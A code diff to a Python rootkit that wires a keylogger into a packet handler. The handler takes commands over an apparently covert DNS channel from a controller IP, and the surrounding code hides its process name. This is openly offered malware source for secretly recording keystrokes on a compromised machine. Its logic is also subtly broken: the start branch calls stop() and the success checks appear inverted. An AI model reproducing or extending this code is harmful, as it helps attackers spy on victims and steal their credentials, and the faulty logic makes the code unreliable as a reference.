@@ -23,12 +23,12 @@ from utils.encryption import StreamEncryption, BlockEncryption
 from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER
 from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
+from utils.keylogger import Keylogger
 
 # Third Party Libraries
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
 from watchdog.observers import Observer
 from watchdog.events import PatternMatchingEventHandler, FileSystemEventHandler
-from pynput.keyboard import Key, Listener
 
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
@@ -56,6 +56,7 @@ CONTROLLER_IP = ARGS.controller_ip
 NETWORK_INTERFACE = ARGS.interface
 STREAM_ENCRYPTION_HANDLER = StreamEncryption()
 BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
+KEYLOGGER_INSTANCE = Keylogger()
 MONITOR_IDENTIFICATION = 14562
 KEYLOG_IDENTIFICATION = 32586
 GENERAL_MSG_IDENTIFICATION = 19375
@@ -270,8 +271,6 @@ def execute_watch_command(path: str) -> bool:
     return True
 
 
-
-
 def packet_handler(pkt):
     """
     
@@ -287,10 +286,18 @@ def packet_handler(pkt):
             execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
             if argv[1] == STOP:
-                print("stop keylogger")
+                if KEYLOGGER_INSTANCE.stop() == False:
+                    print("SUCCESS: Stopped keylogger")
+                else:
+                    print("FAILED: You can't stop an inactive keylogger")
             if argv[1] == START:
-                print("start keylogger")
+                if KEYLOGGER_INSTANCE.stop() == False:
+                    print("SUCCESS: Started keylogger")
+                else:
+                    print("FAILED: You can't start an active keylogger")
             if argv[1] == TRANSFER:
+                # 1. Get the keylog data.
+                # 2. Transfer it to the controller.
                 print("transfer keylogger")
 
 
